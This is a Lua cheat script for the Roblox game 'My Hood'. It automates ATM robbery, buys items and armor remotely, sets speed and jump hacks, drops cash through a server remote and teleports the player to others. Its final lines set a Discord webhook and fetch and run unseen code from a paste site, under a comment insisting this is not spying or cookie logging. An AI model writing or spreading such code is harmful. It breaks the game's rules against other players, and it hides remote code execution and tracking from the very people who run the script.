local f = loadstring(game:HttpGet("https://raw.githubusercontent.com/laderite/bleklib/main/library.lua"))()
local t = false
local h =
    f:Create(
    {
        Name = "hzck#2702 | My Hood v1.1 But not skid proof",
        StartupSound = {Toggle = false, SoundID = "rbxassetid://6958727243", TimePosition = 1}
    }
)
local i = h:Tab("Credits")
i:Label("My Hood")
i:Label("made by hzck#2702")
i:Label("discord.gg/u5UnfRwtJE")
i:Button(
    "Copy Discord Link",
    function()
        setclipboard("discord.gg/u5UnfRwtJE")
    end
)
i:Button(
    "Exit Script",
    function()
        h:Exit()
    end
)
local r = h:Tab("Items")
r:Button(
    "Katana ($3200)",
    function()
        fireclickdetector(game:GetService("Workspace").Buy["[Katana] - $3200"].ClickDetector)
    end
)
r:Button(
    "RPG ($16,000)",
    function()
        fireclickdetector(game:GetService("Workspace").Buy["[RPG] - $16,000"].ClickDetector)
    end
)
r:Button(
    "Silencer ($5,400)",
    function()
        fireclickdetector(game:GetService("Workspace").Buy["[Silencer] - $5,400"].ClickDetector)
    end
)
r:Button(
    "SMG ($5,000)",
    function()
        fireclickdetector(game:GetService("Workspace").Buy["[SMG] - $5,000"].ClickDetector)
    end
)
r:Button(
    "Tactical Shotgun ($6,000)",
    function()
        fireclickdetector(game:GetService("Workspace").Buy["[Tactical Shotgun] - $6,000"].ClickDetector)
    end
)
r:Button(
    "Hamburger ($5)",
    function()
        fireclickdetector(game:GetService("Workspace").Buy["[Hamburger] - $5"].ClickDetector)
    end
)
local s = h:Tab("Others")
s:Button(
    "Firework ($10,000)",
    function()
        fireclickdetector(game:GetService("Workspace").Buy["[Firework] - $10,000"].ClickDetector)
    end
)
s:Button(
    "High Auto Armor",
    function()
        local _ = "hzck / My Hood"
        local md = "You can't deactive this feature."
        local cm = 5
        local fc = "info"
        game:GetService("ReplicatedStorage").LT_Notification:FireServer(_, md, cm, fc)
        while true do
            wait(.1)
            local p = game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
            local l = game.Players.LocalPlayer
            if l.Armor.Value < 50 then
                if p.Health > 2 then
                    local _ = "hzck / My Hood"
                    local md = "Bought Full Armor"
                    local cm = 3
                    local fc = "success"
                    game:GetService("ReplicatedStorage").LT_Notification:FireServer(_, md, cm, fc)
                    fireclickdetector(
                        game:GetService("Workspace").ArmorPads["[Full  Armor] - $7,000"].Head.ClickDetector
                    )
                else
                    game:GetService("ReplicatedStorage").LT_Notification:FireServer(_, md, cm, fc)
                end
            end
        end
    end
)
s:Button(
    "Auto-Farm (Cant stop)",
    function(q)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-477, 22, -332)
        wait(0.2)
        local q_ = game:service("VirtualInputManager")
        q_:SendKeyEvent(true, "E", false, game)
        task.wait(4.1)
        q_:SendKeyEvent(false, "E", false, game)
        local _ = "Information"
        local md = "Success robbed ATM"
        local cm = 2
        local fc = "success"
        game:GetService("ReplicatedStorage").LT_Notification:FireServer(_, md, cm, fc)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(97, 22, -521)
        wait(0.2)
        q_:SendKeyEvent(true, "E", false, game)
        task.wait(4.1)
        q_:SendKeyEvent(false, "E", false, game)
        local _ = "Information"
        local md = "Success robbed ATM"
        local cm = 2
        local fc = "success"
        game:GetService("ReplicatedStorage").LT_Notification:FireServer(_, md, cm, fc)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(521, 48, -297)
        wait(0.2)
        q_:SendKeyEvent(true, "E", false, game)
        task.wait(4.1)
        q_:SendKeyEvent(false, "E", false, game)
        local _ = "Information"
        local md = "Success robbed ATM"
        local cm = 2
        local fc = "success"
        game:GetService("ReplicatedStorage").LT_Notification:FireServer(_, md, cm, fc)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-644, 22, -148)
        wait(0.2)
        q_:SendKeyEvent(true, "E", false, game)
        task.wait(4.1)
        q_:SendKeyEvent(false, "E", false, game)
        local _ = "Information"
        local md = "Success robbed ATM"
        local cm = 2
        local fc = "success"
        game:GetService("ReplicatedStorage").LT_Notification:FireServer(_, md, cm, fc)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-399, 22, -589)
        wait(0.2)
        q_:SendKeyEvent(true, "E", false, game)
        task.wait(4.1)
        q_:SendKeyEvent(false, "E", false, game)
        local _ = "Information"
        local md = "Success robbed ATM"
        local cm = 2
        local fc = "success"
        game:GetService("ReplicatedStorage").LT_Notification:FireServer(_, md, cm, fc)
        local _ = "Information"
        local md = "PLEASE WAIT A LITTLE BIT!"
        local cm = 33
        local fc = "info"
        game:GetService("ReplicatedStorage").LT_Notification:FireServer(_, md, cm, fc)
        wait(33)
    end
)
s:Button(
    "Full Armor ($7,000)",
    function()
        fireclickdetector(game:GetService("Workspace").ArmorPads["[Full  Armor] - $7,000"].Head.ClickDetector)
    end
)
s:Button(
    "Lettuce",
    function()
        fireclickdetector(game:GetService("Workspace").Buy["[Lettuce] - $0"].ClickDetector)
    end
)
local tf = h:Tab("Local")
tf:Toggle(
    "Fast Speed",
    function(d)
        if d == true then
            local a = game.Players.LocalPlayer.Character
            local sr = a.Humanoid
            sr.WalkSpeed = "150"
        end
        if d == false then
            local a = game.Players.LocalPlayer.Character
            local sr = a.Humanoid
            sr.WalkSpeed = "17"
        end
    end
)
tf:Toggle(
    "Superman Mode",
    function(m)
        if m == true then
            local a = game.Players.LocalPlayer.Character
            local pa = a.Humanoid
            local b = {[1] = "superhero!", [2] = "All"}
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(b))
            pa.WalkSpeed = "100"
            pa.JumpPower = "115"
        elseif m == false then
            local a = game.Players.LocalPlayer.Character
            local pa = a.Humanoid
            pa.WalkSpeed = "17"
            pa.JumpPower = "45"
        end
    end
)
local lp = h:Tab("Cash")
lp:Button(
    "Drop Cash",
    function()
        local e = "Wallet"
        local g = game:GetService("Players").LocalPlayer
        if g.Backpack:FindFirstChild(e) and g.Character:FindFirstChild(e) == nil then
            local n = g.Backpack:FindFirstChild(e)
            g.Character.Humanoid:EquipTool(n)
        end
        local _ = "100000"
        game:GetService("ReplicatedStorage").WalletRemotes.DropCash:FireServer(_)
    end
)
local q_n = h:Tab("Target")
q_n:Textbox(
    "Teleport to a:",
    function(c)
        players = game:GetService("Players")
        targetPlayer = players:FindFirstChild(c)
        players.LocalPlayer.Character:MoveTo(targetPlayer.Character.HumanoidRootPart.Position)
    end
)

--Yes, we use webhook, only that we see who is executing the script,  that is not spying or cookie logging.
getgenv().DiscordWebhook =
    "L"
loadstring(game:HttpGet("https://pst.klgrth.io/paste/e3d52/raw"))()